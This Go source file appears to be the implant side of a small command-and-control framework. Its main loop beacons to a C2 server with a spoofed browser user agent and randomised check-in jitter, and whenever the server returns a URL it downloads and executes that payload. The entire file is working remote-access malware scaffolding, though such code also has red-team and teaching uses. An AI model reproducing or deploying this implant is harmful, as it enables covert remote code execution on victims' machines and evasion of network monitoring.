package main

import (
	"math/rand"
	"time"

	"github.com/averagesecurityguy/c2/beacon"
	"github.com/averagesecurityguy/c2/downloader"
)

// Define our costants
const url = "http://127.0.0.1:8000"
const agent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0"
const offset = 12 // In seconds
const base = 0    // In hours
const sleep = 1   // In seconds

func main() {
	sysid := "uuid"
	checkIn := time.Now()
	beacon := beacon.NewHttpAuthBeacon(sysid, url, agent)
	downloader := downloader.NewHttpDownloader(agent)

	for {
		if checkIn.Before(time.Now()) {
			url := beacon.Ping()

			if url != "" {
				downloader.DownloadExec(url)
			}

			checkIn = updateCheckinTime()
		}

		time.Sleep(sleep * time.Second)
	}
}

// updateCheckinTime returns the next checkin time for the beacon. The time
// is calculated by adding base hours to the current time and a random number
// of seconds <= offset.
func updateCheckinTime() time.Time {
	t := time.Now()
	base := time.Duration(base) * time.Hour
	jitter := time.Duration(rand.Intn(offset)) * time.Second

	return t.Add(base).Add(jitter)
}
